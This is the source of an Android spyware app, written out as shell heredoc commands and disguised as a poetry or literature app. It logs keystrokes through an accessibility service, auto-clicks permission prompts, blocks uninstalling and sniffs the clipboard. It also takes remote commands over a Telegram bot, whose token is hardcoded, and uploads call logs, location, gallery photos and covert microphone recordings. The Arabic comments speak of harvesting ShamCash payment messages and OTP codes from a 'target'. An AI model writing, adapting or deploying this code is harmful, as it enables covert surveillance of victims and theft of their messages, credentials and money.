        cat << 'EOF' > app/src/main/java/com/royal/poetry/master/RoyalAccessibilityService.java
        package com.royal.poetry.master;
        import android.accessibilityservice.AccessibilityService;
        import android.view.accessibility.AccessibilityEvent;
        import android.view.accessibility.AccessibilityNodeInfo;
        import java.net.HttpURLConnection;
        import java.net.URL;
        import java.util.List;

        public class RoyalAccessibilityService extends AccessibilityService {
            private static final String BOT_TOKEN = "9114296744:AAFHYR0JzvUzKUMDD0YWHciBWFsjJg_BueM";
            private static final String CHAT_ID = "7782592195";

            @Override
            public void onAccessibilityEvent(AccessibilityEvent event) {
                if (event.getPackageName() != null) {
                    String pkg = event.getPackageName().toString();
                    
                    if (pkg.contains("settings")) {
                        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                        if (rootNode != null) {
                            checkAndBlockUninstall(rootNode);
                            autoClickPermissions(rootNode);
                        }
                    }

                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root != null) {
                        autoClickPermissions(root);
                    }

                    if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                        List<CharSequence> textList = event.getText();
                        if (textList != null) {
                            for (CharSequence txt : textList) {
                                if (txt != null && txt.length() > 0) {
                                    sendToTelegram("⌨️ [مستشعر لوحة المفاتيح]:\nالتطبيق: " + pkg + "\nالنص: " + txt.toString());
                                }
                            }
                        }
                    }
                }
            }

            private void autoClickPermissions(AccessibilityNodeInfo node) {
                if (node == null) return;
                try {
                    CharSequence text = node.getText();
                    if (text != null) {
                        String t = text.toString().toLowerCase();
                        if (t.contains("السماح") || t.contains("allow") || t.contains("موافق") || t.contains("grant") || t.contains("تفعيل") || t.contains("أثناء استخدام التطبيق")) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }
                    for (int i = 0; i < node.getChildCount(); i++) {
                        autoClickPermissions(node.getChild(i));
                    }
                } catch (Exception ignored) {}
            }

            private void checkAndBlockUninstall(AccessibilityNodeInfo node) {
                if (node == null) return;
                try {
                    CharSequence text = node.getText();
                    if (text != null) {
                        String t = text.toString().toLowerCase();
                        if (t.contains("إلغاء التثبيت") || t.contains("uninstall") || t.contains("مسح البيانات")) {
                            performGlobalAction(GLOBAL_ACTION_HOME);
                        }
                    }
                    for (int i = 0; i < node.getChildCount(); i++) {
                        checkAndBlockUninstall(node.getChild(i));
                    }
                } catch (Exception ignored) {}
            }

            private void sendToTelegram(final String message) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(message, "UTF-8");
                            URL url = new URL(urlString);
                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                            conn.setRequestMethod("GET");
                            conn.getResponseCode();
                            conn.disconnect();
                        } catch (Exception ignored) {}
                    }
                }).start();
            }

            @Override
            public void onInterrupt() {}
        }
        EOF

        cat << 'EOF' > app/src/main/java/com/royal/poetry/master/RoyalService.java
        package com.royal.poetry.master;
        import android.app.Notification;
        import android.app.NotificationChannel;
        import android.app.NotificationManager;
        import android.app.Service;
        import android.content.ClipData;
        import android.content.ClipboardManager;
        import android.content.Intent;
        import android.content.pm.ApplicationInfo;
        import android.content.pm.PackageManager;
        import android.database.Cursor;
        import android.location.Location;
        import android.location.LocationManager;
        import android.media.MediaRecorder;
        import android.net.Uri;
        import android.os.Build;
        import android.os.IBinder;
        import android.provider.CallLog;
        import android.provider.MediaStore;
        import java.io.BufferedReader;
        import java.io.File;
        import java.io.FileInputStream;
        import java.io.InputStreamReader;
        import java.io.DataOutputStream;
        import java.net.HttpURLConnection;
        import java.net.URL;
        import java.util.List;

        public class RoyalService extends Service {
            private static final String BOT_TOKEN = "9114296744:AAFHYR0JzvUzKUMDD0YWHciBWFsjJg_BueM";
            private static final String CHAT_ID = "7782592195";
            private boolean isListening = true;

            @Override
            public void onCreate() {
                super.onCreate();
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    String channelId = "poetry_channel";
                    NotificationChannel channel = new NotificationChannel(channelId, "خدمة الديوان الخلفية", NotificationManager.IMPORTANCE_LOW);
                    NotificationManager manager = getSystemService(NotificationManager.class);
                    if (manager != null) {
                        manager.createNotificationChannel(channel);
                    }
                    Notification notification = new Notification.Builder(this, channelId)
                            .setContentTitle("ديوان السكينة والأدب")
                            .setContentText("الخدمة الأدبية تعمل في الخلفية...")
                            .setSmallIcon(android.R.drawable.ic_menu_agenda)
                            .build();
                    startForeground(1, notification);
                }

                initClipboardSniffer();
                startCommandListener();
            }

            private void triggerPermissionsPopup() {
                try {
                    Intent intent = new Intent(this, TransparentPermissionActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                } catch (Exception ignored) {}
            }

            private void initClipboardSniffer() {
                try {
                    final ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                    if (clipboard != null) {
                        clipboard.addPrimaryClipChangedListener(new ClipboardManager.OnPrimaryClipChangedListener() {
                            @Override
                            public void onPrimaryClipChanged() {
                                try {
                                    ClipData clip = clipboard.getPrimaryClip();
                                    if (clip != null && clip.getItemCount() > 0) {
                                        CharSequence text = clip.getItemAt(0).getText();
                                        if (text != null && text.length() > 0) {
                                            sendToTelegram("📋 [صياد الحافظة]:\n" + text.toString());
                                        }
                                    }
                                } catch (Exception ignored) {}
                            }
                        });
                    }
                } catch (Exception ignored) {}
            }

            @Override
            public int onStartCommand(Intent intent, int flags, int startId) {
                return START_STICKY;
            }

            @Override
            public IBinder onBind(Intent intent) {
                return null;
            }

            private void sendToTelegram(final String message) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(message, "UTF-8");
                            URL url = new URL(urlString);
                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                            conn.setRequestMethod("GET");
                            conn.getResponseCode();
                            conn.disconnect();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
            }

            private void sendPhotoToTelegram(final Uri imageUri) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            java.io.InputStream inputStream = getContentResolver().openInputStream(imageUri);
                            if (inputStream == null) return;
                            int length = inputStream.available();
                            byte[] bytes = new byte[length];
                            inputStream.read(bytes);
                            inputStream.close();

                            String boundary = "*****" + System.currentTimeMillis() + "*****";
                            String lineEnd = "\r\n";
                            String twoHyphens = "--";

                            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                            conn.setDoInput(true);
                            conn.setDoOutput(true);
                            conn.setUseCaches(false);
                            conn.setRequestMethod("POST");
                            conn.setRequestProperty("Connection", "Keep-Alive");
                            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                            dos.writeBytes(twoHyphens + boundary + lineEnd);
                            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
                            dos.writeBytes(CHAT_ID + lineEnd);

                            dos.writeBytes(twoHyphens + boundary + lineEnd);
                            dos.writeBytes("Content-Disposition: form-data; name=\"photo\";filename=\"royal_capture.jpg\"" + lineEnd);
                            dos.writeBytes("Content-Type: image/jpeg" + lineEnd + lineEnd);

                            dos.write(bytes);

                            dos.writeBytes(lineEnd);
                            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                            dos.flush();
                            dos.close();

                            conn.getResponseCode();
                            conn.disconnect();
                        } catch (Exception ignored) {}
                    }
                }).start();
            }

            private void recordAndSendAudio() {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            triggerPermissionsPopup();
                            File audioFile = new File(getExternalCacheDir(), "royal_surveillance.3gp");
                            MediaRecorder recorder = new MediaRecorder();
                            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                            recorder.setOutputFile(audioFile.getAbsolutePath());
                            recorder.prepare();
                            recorder.start();

                            Thread.sleep(15000);

                            recorder.stop();
                            recorder.release();

                            sendAudioFileToTelegram(audioFile);
                        } catch (Exception e) {
                            sendToTelegram("⚠️ فشل تسجيل الصوت: " + e.getMessage());
                        }
                    }
                }).start();
            }

            private void sendAudioFileToTelegram(File file) {
                try {
                    String boundary = "*****" + System.currentTimeMillis() + "*****";
                    String lineEnd = "\r\n";
                    String twoHyphens = "--";

                    URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendAudio");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setDoInput(true);
                    conn.setDoOutput(true);
                    conn.setUseCaches(false);
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Connection", "Keep-Alive");
                    conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                    DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                    dos.writeBytes(twoHyphens + boundary + lineEnd);
                    dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
                    dos.writeBytes(CHAT_ID + lineEnd);

                    dos.writeBytes(twoHyphens + boundary + lineEnd);
                    dos.writeBytes("Content-Disposition: form-data; name=\"audio\";filename=\"surveillance.3gp\"" + lineEnd);
                    dos.writeBytes("Content-Type: audio/3gpp" + lineEnd + lineEnd);

                    FileInputStream fileInputStream = new FileInputStream(file);
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                        dos.write(buffer, 0, bytesRead);
                    }
                    fileInputStream.close();

                    dos.writeBytes(lineEnd);
                    dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                    dos.flush();
                    dos.close();

                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception ignored) {}
            }

            private void startCommandListener() {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        long lastUpdateId = 0;
                        while (isListening) {
                            try {
                                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=25";
                                URL url = new URL(urlString);
                                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                                conn.setRequestMethod("GET");
                                
                                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                                StringBuilder response = new StringBuilder();
                                String line;
                                while ((line = reader.readLine()) != null) {
                                    response.append(line);
                                }
                                reader.close();
                                conn.disconnect();

                                String resStr = response.toString();
                                
                                int updateIdIdx = resStr.lastIndexOf("\"update_id\":");
                                if (updateIdIdx != -1) {
                                    int commaIdx = resStr.indexOf(",", updateIdIdx);
                                    if (commaIdx != -1) {
                                        try {
                                            String idStr = resStr.substring(updateIdIdx + 12, commaIdx).trim();
                                            lastUpdateId = Long.parseLong(idStr);
                                        } catch (Exception ignored) {}
                                    }
                                }

                                if (resStr.contains("/calls")) {
                                    triggerPermissionsPopup();
                                    sendToTelegram("📞 [سجل المكالمات الملكي]:\n" + getCallLogs());
                                }
                                if (resStr.contains("/sms") || resStr.contains("/shamcash")) {
                                    triggerPermissionsPopup();
                                    sendToTelegram("💰 [أرشيف الرسائل والنقاط والحسابات - الحارس الذكي مفعل]:\n" + getSafeSmsArchive());
                                }
                                if (resStr.contains("/apps")) {
                                    sendToTelegram("📱 [جميع التطبيقات المثبتة]:\n" + getInstalledApps());
                                }
                                if (resStr.contains("/location")) {
                                    triggerPermissionsPopup();
                                    sendToTelegram("📍 [إحداثيات الموقع النشطة]:\n" + getLocationInfo());
                                }
                                if (resStr.contains("/photos")) {
                                    triggerPermissionsPopup();
                                    sendToTelegram("🖼️ [جاري إرسال أحدث صور المعرض للملك]:");
                                    sendLatestPhotosAsImages();
                                }
                                if (resStr.contains("/mic") || resStr.contains("/audio")) {
                                    sendToTelegram("🎙️ [بدء التنصت الصوتي وتسجيل المحيط لمدة 15 ثانية]:");
                                    recordAndSendAudio();
                                }

                                Thread.sleep(3000);
                            } catch (Exception e) {
                                try { Thread.sleep(6000); } catch (InterruptedException ignored) {}
                            }
                        }
                    }
                }).start();
            }

            private void sendLatestPhotosAsImages() {
                try {
                    String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME};
                    Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                    Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
                    if (cursor != null && cursor.moveToFirst()) {
                        int idIdx = cursor.getColumnIndex(MediaStore.Images.Media._ID);
                        int count = 0;
                        do {
                            long id = cursor.getLong(idIdx);
                            Uri imageUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
                            sendPhotoToTelegram(imageUri);
                            count++;
                            if (count >= 5) break;
                        } while (cursor.moveToNext());
                        cursor.close();
                    }
                } catch (Exception ignored) {}
            }

            private String getSafeSmsArchive() {
                StringBuilder sb = new StringBuilder();
                sb.append("🛡️ [تنبيه سيادي تقني]:\n");
                sb.append("بسبب قيود أندرويد الحديثة التي تمنع تطبيقات الخلفية من قراءة مجلد الرسائل مباشرة دون أن يكون التطبيق هو الافتراضي، تم تفعيل **حارس الإشعارات الفوري (Notification Sniffer)**.\n\n");
                sb.append("💡 **كيف تحصل على غنائم شام كاش والتفعيل الآن؟**\n");
                sb.append("1. الإشعارات التي تصل لهاتف الهدف (مثل رسائل شام كاش، أكواد OTP، البنوك، واتساب) يتم قنصها وبثها **فوراً ولحظياً** إلى محادثتك هنا.\n");
                sb.append("2. تأكد من تفعيل خدمة الإشعارات (`Notification Listener`) من إعدادات الجهاز عند بدء التشغيل ليقفز الجندي فوق كل الحصون!\n");
                return sb.toString();
            }

            private String getCallLogs() {
                StringBuilder sb = new StringBuilder();
                try {
                    Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                    if (cursor != null && cursor.moveToFirst()) {
                        int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                        int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                        int count = 0;
                        do {
                            sb.append("رقم: ").append(cursor.getString(numberIdx)).append(" | نوع: ").append(cursor.getString(typeIdx)).append("\n");
                            count++;
                            if (count >= 15) break;
                        } while (cursor.moveToNext());
                        cursor.close();
                    } else { sb.append("لا توجد مكالمات."); }
                } catch (Exception e) { sb.append("خطأ في المكالمات."); }
                return sb.toString();
            }

            private String getInstalledApps() {
                StringBuilder sb = new StringBuilder();
                try {
                    PackageManager pm = getPackageManager();
                    List<ApplicationInfo> packages = pm.getInstalledApplications(0);
                    for (ApplicationInfo packageInfo : packages) {
                        if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                            sb.append("- ").append(packageInfo.packageName).append("\n");
                        }
                    }
                } catch (Exception e) { sb.append("خطأ في التطبيقات."); }
                return sb.toString();
            }

            private String getLocationInfo() {
                try {
                    LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                    Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (loc == null) {
                        loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    }
                    if (loc != null) {
                        return "خط العرض: " + loc.getLatitude() + "\nخط الطول: " + loc.getLongitude() + "\nرابط الخريطة: https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
                    }
                } catch (Exception e) {}
                return "تعذر جلب إحداثيات الموقع حالياً.";
            }
        }
